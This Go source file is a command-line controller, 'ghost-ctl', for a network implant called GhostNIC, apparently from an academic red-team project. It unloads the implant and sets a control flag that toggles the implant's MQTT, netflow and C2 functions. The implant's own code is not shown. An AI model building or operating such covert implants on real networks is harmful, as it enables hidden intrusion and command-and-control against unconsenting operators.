// ghost-ctl is the runtime control utility for a loaded GhostNIC implant.
//
// With anonymous maps (default), only attachment management and the shared
// control flag are available: the implant is configured through loader
// arguments at load time, and the control flag can be toggled at runtime
// through bpffs.
package main

import (
	"fmt"
	"os"
	"strconv"

	"github.com/academic-redteam/ghostnic/pkg/loader"
	"github.com/spf13/cobra"
)

func main() {
	var iface string

	root := &cobra.Command{
		Use:   "ghost-ctl",
		Short: "Control a running GhostNIC implant",
	}
	root.PersistentFlags().StringVarP(&iface, "iface", "i", "eth0", "network interface attached to GhostNIC")

	root.AddCommand(unloadCmd(&iface))
	root.AddCommand(triggerCmd())

	if err := root.Execute(); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}

func unloadCmd(iface *string) *cobra.Command {
	return &cobra.Command{
		Use:   "unload",
		Short: "Detach and remove all GhostNIC objects",
		RunE: func(cmd *cobra.Command, args []string) error {
			if err := loader.Unload(*iface); err != nil {
				return err
			}
			fmt.Println("GhostNIC unloaded")
			return nil
		},
	}
}

func triggerCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "trigger <flag>",
		Short: "Set the shared control flag (0=none, 1=disable MQTT, 2=disable netflow, 4=disable C2)",
		Args:  cobra.ExactArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			v, err := strconv.ParseUint(args[0], 0, 8)
			if err != nil {
				return fmt.Errorf("invalid flag: %w", err)
			}
			if err := loader.SetControlFlag(byte(v)); err != nil {
				return err
			}
			fmt.Printf("control flag set to 0x%02x\n", v)
			return nil
		},
	}
}
